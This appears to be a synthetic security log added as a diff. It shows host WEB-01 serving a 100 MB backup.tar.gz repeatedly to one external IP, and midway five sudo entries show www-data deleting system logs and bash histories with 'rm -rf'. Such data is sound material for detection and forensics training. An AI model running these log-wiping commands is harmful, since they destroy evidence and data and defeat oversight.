+2025-06-10 09:06:06,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:06 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:07,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:07 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:08,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:08 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:09,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:09 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:10,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:10 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:11,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:11 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:12,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:12 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:13,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:13 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:14,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:14 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:15,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:15 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:16,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:16 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:17,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:17 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:18,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:18 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:19,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:19 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:20,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:20 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:21,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:21 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:22,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:22 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:23,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:23 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:24,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:24 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:25,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:25 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:26,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:26 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:27,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:27 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:28,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:28 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:29,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:29 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:30,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:30 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:31,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:31 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:32,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:32 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:33,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:33 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:34,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:34 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:35,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:35 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:36,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:36 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:37,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:37 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:38,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:38 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:39,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:39 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:40,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:40 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:41,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:41 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:42,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:42 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:43,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:43 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:44,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:44 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:45,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:45 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:46,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:46 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:47,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:47 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:48,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:48 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:49,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:49 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:50,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:50 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:51,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:51 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:52,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:52 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:53,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:53 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:54,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:54 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:55,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:55 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:56,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:56 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:57,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:57 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:58,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:58 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:59,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:59 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:07:00,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:07:00 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:07:01,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:07:01 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:07:02,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:07:02 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:07:03,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:07:03 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:07:04,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:07:04 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:07:05,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:07:05 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:07:06,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:07:06 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:07:07,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:07:07 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:07:08,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:07:08 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:07:09,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:07:09 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:07:10,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:07:10 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:07:11,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:07:11 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:07:12,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:07:12 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:07:13,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:07:13 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:07:14,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:07:14 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:07:15,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:07:15 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:07:16,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:07:16 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:07:17,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:07:17 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:07:18,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:07:18 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:07:19,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:07:19 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:07:20,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:07:20 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:10:00,172.16.10.20,WEB-01,sudo,www-data : USER=root ; COMMAND=/bin/rm -rf /var/log/nginx/access.log
+2025-06-10 09:10:01,172.16.10.20,WEB-01,sudo,www-data : USER=root ; COMMAND=/bin/rm -rf /var/log/auth.log
+2025-06-10 09:10:02,172.16.10.20,WEB-01,sudo,www-data : USER=root ; COMMAND=/bin/rm -rf /var/log/syslog
+2025-06-10 09:10:03,172.16.10.20,WEB-01,sudo,www-data : USER=root ; COMMAND=/bin/rm -rf /root/.bash_history
+2025-06-10 09:10:04,172.16.10.20,WEB-01,sudo,www-data : USER=root ; COMMAND=/bin/rm -rf /home/www-data/.bash_history
+2025-06-10 09:15:00,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:00 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:01,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:01 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:02,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:02 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:03,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:03 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:04,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:04 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:05,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:05 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:06,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:06 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:07,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:07 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:08,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:08 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:09,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:09 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:10,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:10 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:11,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:11 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:12,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:12 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:13,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:13 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:14,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:14 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:15,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:15 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:16,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:16 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:17,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:17 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:18,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:18 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
